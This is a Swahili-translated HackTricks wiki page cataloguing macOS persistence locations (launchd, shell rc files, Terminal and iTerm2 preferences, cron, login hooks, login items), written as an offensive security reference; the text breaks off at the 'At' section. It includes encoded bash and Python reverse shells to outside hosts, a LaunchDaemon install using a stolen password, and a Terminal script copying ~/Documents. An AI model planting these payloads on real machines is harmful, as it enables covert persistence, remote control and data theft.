# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Sekta hii inategemea kwa kiasi kikubwa mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), lengo ni kuongeza **Autostart Locations** zaidi (ikiwezekana), kuonyesha **mbinu ambazo bado zinafanya kazi** siku hizi na toleo la hivi karibuni la macOS (13.4) na kubainisha **ruksa zinazohitajika**.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **sandbox bypass** ambayo yanakuwezesha tu kuendesha kitu kwa **kuandika kwenye faili** na **kusubiri** kwa ajili ya **tendo** la kawaida, **muda maalum** au **tendo unaloweza kawaida kufanya** kutoka ndani ya sandbox bila ya kuhitaji ruhusa za root.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Anzisha upya
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Anzisha upya
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Anzisha upya
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Anzisha upya
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Kuingia tena
- **`~/Library/LaunchDemons`**
- **Trigger**: Kuingia tena

> [!TIP]
> Kama ukweli wa kuvutia, **`launchd`** ina embedded property list katika sehemu ya Mach-o `__Text.__config` ambayo ina huduma nyingine zinazoonekana ambazo launchd lazima izianzishe. Zaidi ya hayo, huduma hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess` ambazo zinamaanisha kwamba lazima zifanywe na kukamilika kwa mafanikio.
>
> Bila shaka, haiwezi kubadilishwa kwa sababu ya code signing.

#### Description & Exploitation

**`launchd`** ni **mchakato** wa **kwanza** unaotekelezwa na OX S kernel wakati wa kuanzisha na ni mchakato wa mwisho kumalizika wakati wa kuzima. Inapaswa kila wakati kuwa na **PID 1**. Mchakato huu uta **soma na kutekeleza** muundo ulioonyeshwa katika **ASEP** **plists** katika:

- `/Library/LaunchAgents`: Per-user agents installed by the admin
- `/Library/LaunchDaemons`: System-wide daemons installed by the admin
- `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.

Wakati mtumiaji anaingia, plists zilizopo katika `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` zinaanza kwa ruhusa za **watumiaji walioingia**.

Tofauti kuu kati ya agents na daemons ni kwamba agents zinapakiwa wakati mtumiaji anaingia na daemons zinapakiwa wakati wa kuanzisha mfumo (kwa sababu kuna huduma kama ssh ambazo zinahitajika kutekelezwa kabla ya mtumiaji yeyote kupata mfumo). Pia agents zinaweza kutumia GUI wakati daemons zinahitaji kuendelea kukimbia kwa background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna matukio ambapo **agent inahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya kusaidia wakati wa kuingia. Pia zinaweza kupatikana katika `/Library/LaunchAgents` (angalia [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).

> [!TIP]
> New Daemons or Agents config files zitatumika **baada ya reboot ijayo au kwa kutumia** `launchctl load <target.plist>`. Ni **pia inawezekana kupakia .plist files bila hiyo extension** kwa `launchctl -F <file>` (hata hivyo hizo plist files hazitapakiwa kiotomatiki baada ya reboot).\
> Ni pia inawezekana **unload** kwa `launchctl unload <target.plist>` (mchakato unaoashiriwa na hiyo utaisha),
>
> Ili **kuhakikisha** kwamba hakuna **kitu** (kama override) **kinachozuia** **Agent** au **Daemon** **kutendeka** endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Orodhesha Agents na Daemons zote zilizowashwa na mtumiaji wa sasa:
```bash
launchctl list
```
#### Mfano wa mfuatano wa LaunchDaemon wenye madhuni (password reuse)

- Andika mzunguko wa agent kwenye `~/.agent` na uifanye iweze kutekelezwa.
- Tengeneza plist katika `/tmp/starter` ikielekeza kwa agent huyo.
- Tumia tena password iliyotorwa kwa `sudo -S` ili kunakili faili kwenye `/Library/LaunchDaemons/com.finder.helper.plist`, weka `root:wheel`, na uiweke kwa `launchctl load`.
- Anzisha agent kimya kwa `nohup ~/.agent >/dev/null 2>&1 &` ili kutenganisha output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ikiwa plist inamilikiwa na mtumiaji, hata ikiwa iko katika daemon system wide folders, **kazi itaendeshwa kama mtumiaji** na si kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya privilege escalation.

#### More info about launchd

**`launchd`** ni mchakato wa kwanza wa user mode unaoanzishwa kutoka kwa kernel. Kuanza kwa mchakato lazima kufanike na hauwezi kutoka au kugongana (crash). Hata limehifadhiwa dhidi ya baadhi ya killing signals.

Moja ya mambo ya kwanza `launchd` itakayofanya ni kuanzisha daemons zote kama:

- **Timer daemons** based on time to be executed:
- atd (`com.apple.atrun.plist`): Ina `StartInterval` ya 30min
- crond (`com.apple.systemstats.daily.plist`): Ina `StartCalendarInterval` kuanza saa 00:15
- **Network daemons** like:
- `org.cups.cups-lpd`: Inasikiliza kwenye TCP (`SockType: stream`) na `SockServiceName: printer`
- SockServiceName lazima iwe au port au service kutoka `/etc/services`
- `com.apple.xscertd.plist`: Inasikiliza kwenye TCP kwenye port 1640
- **Path daemons** that are executed when a specified path changes:
- `com.apple.postfix.master`: Inakagua path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Inaonyesha katika entry ya `MachServices` jina `com.apple.xscertd.helper`
- **UserEventAgent:**
- Hii ni tofauti na ile iliyotangulia. Inafanya launchd kuanzisha apps kama mwitikio kwa tukio maalum. Hata hivyo, katika kesi hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Inapakia plugins kutoka kwenye SIP restricted folder /System/Library/UserEventPlugins/ ambapo kila plugin inaonyesha initializer yake katika ufunguo `XPCEventModuleInitializer` au, kwa plugins za zamani, katika dict `CFPluginFactories` chini ya ufunguo `FB86416D-6164-2070-726F-70735C216EC0` wa `Info.plist` yake.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Fungua terminal na zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Fungua terminal na zsh
- Root required
- **`~/.zlogout`**
- **Trigger**: Exit terminal na zsh
- **`/etc/zlogout`**
- **Trigger**: Exit terminal na zsh
- Root required
- Potentially more in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Fungua terminal na bash
- `/etc/profile` (haikufanya kazi)
- `~/.profile` (haikufanya kazi)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Ilitegemea kuchochea na xterm, lakini **haijawekwa** na hata baada ya kuweka hitilafu hii inaonekana: xterm: `DISPLAY is not set`

#### Description & Exploitation

Unapoanzisha mazingira ya shell kama `zsh` au `bash`, baadhi ya startup files zinaendeshwa. macOS kwa sasa inatumia `/bin/zsh` kama shell ya default. Shell hii inaingilishwa moja kwa moja wakati application ya Terminal inapoanzishwa au wakati kifaa kinapoingiliwa kupitia SSH. Ingawa `bash` na `sh` pia zipo kwenye macOS, zinahitaji kuitwa kwa uwazi ili zitumike.

Man page ya zsh, tunaweza kuisoma kwa **`man zsh`**, ina maelezo marefu ya startup files.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Programu Zilizofunguliwa Tena

> [!CAUTION]
> Ku-configure eksploit iliyotajwa na kutoka (loging-out) na kuingia tena (loging-in) au hata reboot hakuweza kuniruhusu kutekeleza app. (App haikuendeshwa, labda inahitaji kuwa inaendesha wakati vitendo hivi vinapotendwa)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Inafaa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart — kufungua programu tena

#### Maelezo & Exploitation

Programu zote zinazofunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Kwa hivyo, fanya programu zinazofunguliwa tena ziendeshe yako mwenyewe; unahitaji tu **kuongeza app yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha directory hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kukagua programu zitakazofunguliwa tena unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- Inafaa kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal kawaida kuwa na ruhusa za FDA za mtumiaji anayeitumia

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Kichocheo**: Fungua Terminal

#### Maelezo & Exploitation

Katika **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji kwa Applications. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza applications/skripti nyingine**.

Kwa mfano, Terminal inaweza kutekeleza amri wakati wa Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu unaonyeshwa katika faili **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Kwa hivyo, ikiwa plist ya preferences za terminal kwenye mfumo inaweza kuandikwa upya, utendaji wa **`open`** unaweza kutumika **kufungua terminal na amri hiyo itatekelezwa**.

Unaweza kuongeza hii kutoka cli kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Viambatisho vingine vya faili

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal mara nyingi huwa na ruhusa za FDA za mtumiaji — itumie.

#### Mahali

- **Mahali popote**
- **Kichocheo**: Fungua Terminal

#### Maelezo & Exploitation

Iwapo utaunda script ya [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na ukiifungua, **Terminal application** itaanzishwa moja kwa moja kutekeleza amri zilizo ndani yake. Ikiwa **Terminal app** ina ruhusa maalum (kama TCC), amri yako itaendeshwa kwa ruhusa hizo maalum.

Jaribu nayo kwa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Unaweza pia kutumia extensions **`.command`**, **`.tool`**, zenye yaliyomo ya regular shell scripts; zitafunguliwa pia na Terminal.

> [!CAUTION]
> Ikiwa Terminal ina **Full Disk Access** itaweza kukamilisha kitendo hicho (kumbuka kwamba command itakayotekelezwa itaonekana katika dirisha la Terminal).

### Programu-jalizi za Audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Inafaa kutumika ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata upatikanaji wa ziada wa TCC

#### Mahali

- **`/Library/Audio/Plug-Ins/HAL`**
- Inahitaji root
- **Kisababishi**: Anzisha upya coreaudiod au kompyuta
- **`/Library/Audio/Plug-ins/Components`**
- Inahitaji root
- **Kisababishi**: Anzisha upya coreaudiod au kompyuta
- **`~/Library/Audio/Plug-ins/Components`**
- **Kisababishi**: Anzisha upya coreaudiod au kompyuta
- **`/System/Library/Components`**
- Inahitaji root
- **Kisababishi**: Anzisha upya coreaudiod au kompyuta

#### Maelezo

Kulingana na writeups zilizotangulia, inawezekana ku-compile baadhi ya audio plugins na kuzipakia.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Inafaa kutumika ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata upatikanaji wa ziada wa TCC

#### Mahali

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo & Utekelezaji

QuickLook plugins zinaweza kutekelezwa wakati unaposababisha preview ya faili (bonyeza space bar ukiwa umechagua faili katika Finder) na plugin inayounga mkono aina hiyo ya faili imewekwa.

Inawezekana ku-compile QuickLook plugin yako mwenyewe, kuiweka katika moja ya maeneo yaliyotajwa ili kuipakia, kisha nenda kwenye faili inayounga mkono na bonyeza space ili kuisababisha.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Hii haikufanya kazi kwangu, wala si kwa user LoginHook wala kwa root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Inafaa kutumika ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Eneo

- Unahitaji kuwa na uwezo wa kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Iko katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na matumizi lakini zinaweza kutumika kutekeleza commands wakati user anapoingia.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Mpangilio huu umehifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Kuifuta:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Ya mtumiaji root imehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass** ambayo yanakuwezesha kutekeleza kitu kwa urahisi kwa **kuandika kwenye faili** na **kutegemea masharti yasiyo ya kawaida** kama vile **programu maalum zilizosakinishwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.

### Cron

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Hata hivyo, unahitaji uwezo wa kuendesha binary ya `crontab`
- Au kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Sehemu

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Inahitaji root kwa ufikiaji wa kuandika moja kwa moja. Hakuna root inahitajika ikiwa unaweza kuendesha `crontab <file>`
- **Kichocheo**: Inategemea kazi ya cron

#### Maelezo & Exploitation

Orodhesha kazi za cron za **mtumiaji wa sasa** kwa kutumia:
```bash
crontab -l
```
Unaweza pia kuona cron jobs zote za watumiaji katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitaji root).

Katika MacOS, folda kadhaa zinazotekeleza scripts kwa **mara fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (zinatumiwa hasa kusafisha mafaili ya muda). Kazi za periodic za kila siku zinaweza kutekelezwa kwa mfano na: `periodic daily`.

Ili kuongeza **mtumiaji cronjob kwa njia ya programu** inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Maelezo: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Inafaa kuepuka sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 ilikuwa imepewa ruhusa za TCC

#### Maeneo

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Open iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Open iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Open iTerm

#### Maelezo & Exploitation

Skripti zilizohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zitatekelezwa. Kwa mfano:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
au:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Scripti **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia itatekelezwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Mapendeleo ya iTerm2 yaliyopo kwenye **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza **kuonyesha amri ya kutekeleza** wakati terminali ya iTerm2 inafunguliwa.

Mipangilio hii inaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri inaonyeshwa katika mapendeleo:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka amri itakayotekelezwa kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Inayo uwezekano mkubwa kwamba kuna **other ways to abuse the iTerm2 preferences** za kutekeleza amri yoyote.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Inafaa kuiepuka sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini xbar lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Accessibility

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Kichocheo**: Mara tu xbar inapoendeshwa

#### Description

Ikiwa programu maarufu [**xbar**](https://github.com/matryer/xbar) imewekwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inapoanzwa:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Inafaa kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Hammerspoon lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Accessibility

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Mara hammerspoon itakapoanzishwa

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inatoa jukwaa la otomatiki kwa **macOS**, ikitumia lugha ya skripti ya **LUA** kwa operesheni zake. Kwa kuongezea, inaunga mkono ujumuishaji wa msimbo kamili wa **AppleScript** na utekelezaji wa shell scripts, ikiboresha uwezo wake wa kuskripti kwa kiasi kikubwa.

Programu inatafuta faili moja, `~/.hammerspoon/init.lua`, na itakapoanzishwa skripti hiyo itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini BetterTouchTool lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Automation-Shortcuts na Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Tool hii inaruhusu kuonyesha applications au scripts za kutekeleza wakati baadhi ya shortcuts zinabofolewa. Mvumaji anaweza kuwa na uwezo wa kusanidi **shortcut na action ya kutekeleza kwenye database** ili kufanya itekeleze code yeyote (shortcut inaweza kuwa tu kubofya kitufe).

### Alfred

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Alfred lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Automation, Accessibility na hata Full-Disk access

#### Location

- `???`

Inaruhusu kuunda workflows ambazo zinaweza kutekeleza code wakati masharti fulani yanapotimizwa. Inawezekana kwa muvunjaji kuunda faili ya workflow na kufanya Alfred iliipakua (inahitajika kulipia toleo la premium ili kutumia workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini ssh inahitaji kuwa imewashwa na kutumika
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH used to have FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Ingia kupitia ssh
- **`/etc/ssh/sshrc`**
- Root required
- **Trigger**: Ingia kupitia ssh

> [!CAUTION]
> Kuwasha ssh kunahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Kwa default, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anaingia kupitia SSH** skripti **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuendesha `osascript` na vigezo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit payload stored calling **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root required

#### Description

Katika System Preferences -> Users & Groups -> **Login Items** unaweza kupata **vitu vinavyotekelezwa wakati mtumiaji anaingia**.\
Inawezekana kuorodhesha, kuongeza na kuondoa kutoka kwa command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Vitu hivi vinahifadhiwa katika faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** pia zinaweza kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itaweka usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Angalia sehemu iliyotangulia kuhusu Login Items, hii ni nyongeza)

Ikiwa utahifadhi faili ya **ZIP** kama **Login Item**, **`Archive Utility`** itaifungua na ikiwa zip hiyo, kwa mfano, ilihifadhiwa katika **`~/Library`** na iliyo na folda **`LaunchAgents/file.plist`** yenye backdoor, folda hiyo itaundwa (hainaundwi kwa chaguo-msingi) na plist itatolewa hivyo mara inayofuata mtumiaji aingie tena, **backdoor iliyotajwa ndani ya plist itatekelezwa**.

Chaguo nyingine itakuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji, hivyo ikiwa folda LaunchAgents tayari ipo mbinu hii bado itafanya kazi.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji **kuendesha** **`at`** na lazima iwe **imewezeshwa**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Eneo

